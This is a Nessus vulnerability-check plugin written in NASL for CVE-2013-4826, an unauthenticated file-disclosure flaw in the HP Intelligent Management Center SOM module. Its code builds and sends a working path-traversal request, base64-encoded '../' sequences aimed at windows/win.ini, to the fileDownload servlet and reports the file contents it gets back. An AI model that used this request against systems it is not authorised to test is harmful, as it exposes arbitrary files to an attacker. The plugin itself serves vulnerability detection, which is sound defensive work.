#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(71888);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/08/23 21:01:18 $");

  script_cve_id("CVE-2013-4826");
  script_bugtraq_id(62898);
  script_osvdb_id(98251);
  script_xref(name:"HP", value:"emr_na-c03943547");
  script_xref(name:"HP", value:"HPSBGN02930");
  script_xref(name:"HP", value:"SSRT101024");
  script_xref(name:"ZDI", value:"ZDI-13-242");

  script_name(english:"HP Intelligent Management Center SOM Module Information Disclosure");
  script_summary(english:"Attempts to exploit an information disclosure vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"A web application hosted on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The HP Intelligent Management Center (IMC) application running on the
remote host is affected by an information disclosure vulnerability in
the included IMC Service Operation Management (SOM) Module,
specifically within the FileDownload servlet, due to a failure to
require authentication. An unauthenticated, remote attacker can
exploit this, via a specially crafted request, to disclose the
contents of arbitrary files on the system.

Note that HP IMC is reportedly affected by additional vulnerabilities;
however, Nessus has not tested for these.");
  # http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c03943547
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e81620e7");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-242/");
  script_set_attribute(attribute:"solution", value:
"Upgrade the HP IMC SOM Module to version 7.0 E0101 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/10/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/10/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/01/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:intelligent_management_center");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:imc_service_operation_management_software_module");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("hp_imc_web_interface_detect.nbin");
  script_require_ports("Services/www", 8080);
  script_require_keys("installed_sw/HP Intelligent Management Center Web Interface");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

appname = 'HP Intelligent Management Center Web Interface';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:8080);

install = get_single_install(
  app_name: appname,
  port: port,
  exit_if_unknown_ver:FALSE);

path1 =  base64(str:mult_str(str:"../", nb:10) + "windows/win.ini");
path2 =  base64(str:mult_str(str:"..\", nb:10) + "windows\win.ini");

exploit = '/servicedesk/servicedesk/fileDownload?OperType=2&fileName=' +
          path1 + '&filePath=' + path2;

res = http_send_recv3(
  port            : port,
  method          : 'GET',
  item            : exploit,
  exit_on_fail    : TRUE
);

exploit_request = NULL;

if (
  "[Mail]" >< res[2] ||
  "[fonts]" >< res[2] ||
  "; for 16-bit app support" >< res[2]
)
{
  exploit_request = exploit;
  exploit_response = chomp(res[2]);
}

if (!isnull(exploit_request))
{
  report =
    '\n  Nessus was able to exploit the vulnerability with the following' +
    '\n  request : \n\n' + build_url(port:port, qs:exploit_request) + '\n' +
    '\n  Server Response (contents of win.ini) : \n\n' +
    exploit_response + '\n';
  security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:'/'));
